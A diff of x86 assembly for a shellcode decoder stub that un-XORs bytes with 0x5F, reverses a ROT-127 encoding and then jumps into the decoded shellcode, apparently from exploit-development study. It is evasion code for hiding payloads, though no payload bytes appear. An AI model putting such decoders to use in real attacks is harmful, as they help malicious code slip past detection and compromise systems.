@@ -8,7 +8,9 @@ jmp short call_main
 
 decoder:
 	pop esi
-	mov edi, esi ; saving address of Shellcode
+	mov edi, esi ; saving address of Shellcode for rot
+	xor ecx, ecx
+	mov cl, 0x50
 
 unxor:
         xor byte [esi], 0x5F
@@ -25,17 +27,18 @@ rot_127:
 
 low:
 	xor ebx, ebx
-	xor ecx, ecx
+	xor edx, edx
 	mov bl, 0x60
-	mov cl, 0xFF
-	inc cx
+	mov dl, 0xFF
+	inc dx
 	sub [edi], bl
-	sub cx, bx
-	mov [edi], cl
+	sub dx, bx
+	mov [edi], dl
+	jmp shellcode
 
 norm:
 	inc edi
-	jmp rot_127
+	loop rot_127
 
 call_main:
 	call decoder
